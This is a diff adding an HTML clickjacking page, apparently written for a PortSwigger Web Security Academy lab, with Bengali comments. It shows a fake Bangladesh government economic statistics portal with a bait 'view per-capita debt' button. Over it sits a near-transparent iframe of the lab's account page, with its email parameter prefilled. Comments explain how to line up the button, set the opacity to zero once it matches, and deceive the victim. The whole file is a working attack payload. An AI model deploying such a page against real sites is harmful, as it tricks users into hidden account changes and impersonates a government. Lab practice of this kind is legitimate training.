@@ -1,0 +1,154 @@
+<style>
+    /* পুরো পেজটিকে ফুল-স্ক্রিন এবং সুন্দর করার স্টাইল */
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f4f6f9;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+    }
+
+    /* বাংলাদেশ তথ্য পোর্টাল কন্টেইনার (ফুল-স্ক্রিন করা হয়েছে) */
+    .bangladesh-portal {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        background: #ffffff;
+        border-top: 12px solid #006a4e; /* বাংলাদেশ পতাকার সবুজ */
+        padding: 40px;
+        box-sizing: border-box;
+        z-index: 1;
+    }
+
+    /* হেডার সেকশন */
+    .header-area {
+        text-align: center;
+        border-bottom: 2px solid #f0f0f0;
+        padding-bottom: 20px;
+        margin-bottom: 30px;
+    }
+
+    /* লোগো লোড না হলে একটি চমৎকার অল্টারনেটিভ ডিজাইন (CSS Badge) */
+    .govt-logo-box {
+        width: 90px;
+        height: 90px;
+        margin: 0 auto 15px auto;
+        background-color: #006a4e;
+        border: 4px solid #f5cd79;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-weight: bold;
+        font-size: 12px;
+        text-align: center;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    }
+
+    h1 {
+        color: #006a4e;
+        font-size: 26px;
+        margin: 5px 0;
+    }
+
+    h2 {
+        color: #d63031;
+        font-size: 20px;
+        margin-top: 5px;
+    }
+
+    /* তথ্যের টেবিল */
+    .info-table {
+        width: 80%;
+        margin: 20px auto;
+        border-collapse: collapse;
+    }
+
+    .info-table th, .info-table td {
+        border: 1px solid #ddd;
+        padding: 14px;
+        text-align: left;
+        font-size: 16px;
+    }
+
+    .info-table th {
+        background-color: #f8f9fa;
+        color: #333;
+    }
+
+    /* আসল ওয়েবসাইটের অদৃশ্য আইফ্রেম (সবার ওপরে থাকবে) */
+    iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 1000px;
+        height: 700px;
+        opacity: 0.7; /* বাটন মেলাতে ০.৫ রাখুন, মিলে গেলে এটিকে অবশ্যই ০ করে দেবেন */
+        z-index: 2;   /* আইফ্রেম উপরে থাকায় ভিকটিমের ক্লিক এখানে পড়বে */
+        border: none;
+    }
+
+    /* আপনার লাল বাটনের পজিশন কন্ট্রোল */
+    .click-target {
+        position: absolute;
+        top: 430px;     /* আপনার ল্যাবের আসল বাটনের ওপরে-নিচে মেলাতে এটি ব্যবহার করুন */
+        left: 35px;    /* আপনার ল্যাবের আসল বাটনের ডানে-বামে মেলাতে এটি ব্যবহার করুন */
+        z-index: 1;
+    }
+
+    /* প্রফেশনাল ও আকর্ষণীয় ক্লিক বোতাম */
+    .btn-check {
+        background-color: #d63031;
+        color: white;
+        padding: 12px 35px;
+        font-size: 12px;
+        font-weight: bold;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        box-shadow: 0 5px 15px rgba(214, 48, 49, 0.4);
+    }
+</style>
+
+<!-- ভিকটিমকে বোকা বানানোর আসল ও আকর্ষণীয় ফুল-স্ক্রিন পেজ -->
+<div class="bangladesh-portal">
+    <div class="header-area">
+        <!-- ব্রাউজার ভেদে ইমেজ ব্লক হওয়া এড়াতে সিএসএস ভিত্তিক লোগো ব্যাজ ব্যবহার করা হয়েছে -->
+        <div class="govt-logo-box">বাংলাদেশ<br>সরকার</div>
+        <h1>অর্থনৈতিক তথ্য ও পরিসংখ্যান ব্যুরো</h1>
+        <h2>গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</h2>
+    </div>
+
+    <div style="width: 80%; margin: 0 auto;">
+        <p style="font-size: 16px; color: #555; font-weight: bold;">সর্বশেষ আপডেট: অক্টোবর ২০২৬</p>
+    </div>
+    
+    <table class="info-table">
+        <tr>
+            <th>বিবরণ</th>
+            <th>পরিসংখ্যান (টাকায়)</th>
+        </tr>
+        <tr>
+            <td>মোট জাতীয় অর্থনৈতিক বাজেট</td>
+            <td>৭,৯৭,০০০ কোটি টাকা</td>
+        </tr>
+        <tr>
+            <td>বর্তমান মাথাপিছু আয় (Per Capita Income)</td>
+            <td>২,৭৮৫ মার্কিন ডলার</td>
+        </tr>
+        <tr>
+            <td>মাথাপিছু ঋণের হিসাব দেখতে নিচের বাটনে চাপুন</td>
+            <td><span style="color: #d63031; font-weight: bold;">তথ্যটি লক করা আছে</span></td>
+        </tr>
+    </table>
+    
+    <!-- আপনার নকল লাল বাটন -->
+    <div class="click-target">
+        <button class="btn-check">মাথাপিছু ঋণ দেখুন</button>
+    </div>
+</div>
+<!-- ⚠️ মনে রাখবেন: 'Not Found' দূর করতে নিচের src লিংকে আপনার বর্তমান চালু থাকা ল্যাবের তাজা লিংকটি বসাতে হবে -->
+<iframe sandbox="allow-forms" src="https://0a1400c40322779d80f4539f00bb00b6.web-security-academy.net/my-account?email=shifahi@gmail.com"></iframe>
